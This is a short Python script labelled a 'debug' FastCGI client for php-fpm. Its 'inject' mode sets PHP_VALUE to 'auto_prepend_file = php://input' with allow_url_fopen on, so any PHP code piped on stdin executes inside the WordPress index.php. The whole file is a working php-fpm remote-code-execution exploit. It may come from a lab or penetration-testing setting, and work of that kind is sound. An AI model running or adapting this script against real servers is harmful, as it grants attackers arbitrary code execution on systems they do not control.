#!/usr/bin/env python3
"""Debug: minimal FastCGI request to php-fpm, with diagnostics."""
import socket
import struct
import sys

FCGI_BEGIN_REQUEST, FCGI_PARAMS, FCGI_STDIN = 1, 4, 5
FCGI_STDOUT, FCGI_STDERR, FCGI_END_REQUEST = 6, 7, 3


def record(rtype, req_id, body=b""):
    pad = (-len(body)) % 8
    return struct.pack("!BBHHBB", 1, rtype, req_id, len(body), pad, 0) + body + b"\0" * pad


def nvpair(name, value):
    n, v = name.encode(), value.encode()

    def enc(s):
        if len(s) < 128:
            return struct.pack("!B", len(s)) + s
        return struct.pack("!I", 0x80000000 | len(s)) + s

    return enc(n) + enc(v)


php_code = sys.stdin.buffer.read()

params = {
    "GATEWAY_INTERFACE": "FastCGI/1.0",
    "REQUEST_METHOD": "POST",
    "SCRIPT_FILENAME": "/var/www/wordpress/index.php",
    "SCRIPT_NAME": "/index.php",
    "REQUEST_URI": "/index.php",
    "DOCUMENT_ROOT": "/var/www/wordpress",
    "SERVER_SOFTWARE": "fcgi",
    "SERVER_NAME": "localhost",
    "SERVER_PORT": "80",
    "SERVER_PROTOCOL": "HTTP/1.1",
    "QUERY_STRING": "",
    "CONTENT_TYPE": "application/x-www-form-urlencoded",
    "CONTENT_LENGTH": str(len(php_code)),
}

if len(sys.argv) > 1 and sys.argv[1] == "inject":
    params["PHP_VALUE"] = "auto_prepend_file = php://input\nallow_url_fopen = On"

payload = b"".join(nvpair(k, v) for k, v in params.items())

s = socket.create_connection(("127.0.0.1", 9000), timeout=10)
s.settimeout(10)
s.sendall(record(FCGI_BEGIN_REQUEST, 1, struct.pack("!HB5x", 1, 0))
          + record(FCGI_PARAMS, 1, payload)
          + record(FCGI_PARAMS, 1)
          + record(FCGI_STDIN, 1, php_code)
          + record(FCGI_STDIN, 1))

out = err = b""
try:
    while True:
        h = b""
        while len(h) < 8:
            c = s.recv(8 - len(h))
            if not c:
                raise EOFError
            h += c
        _, rt, _, clen, plen, _ = struct.unpack("!BBHHBB", h)
        body = b""
        while len(body) < clen:
            body += s.recv(clen - len(body))
        if plen:
            s.recv(plen)
        if rt == FCGI_STDOUT:
            out += body
        elif rt == FCGI_STDERR:
            err += body
        elif rt == FCGI_END_REQUEST:
            break
except EOFError:
    print("[!] server closed connection (EOF)", file=sys.stderr)
except Exception as e:
    print(f"[!] {type(e).__name__}: {e}", file=sys.stderr)

print("--- STDOUT ---")
print(out.decode("utf-8", "replace"))
if err:
    print("--- STDERR ---")
    print(err.decode("utf-8", "replace"))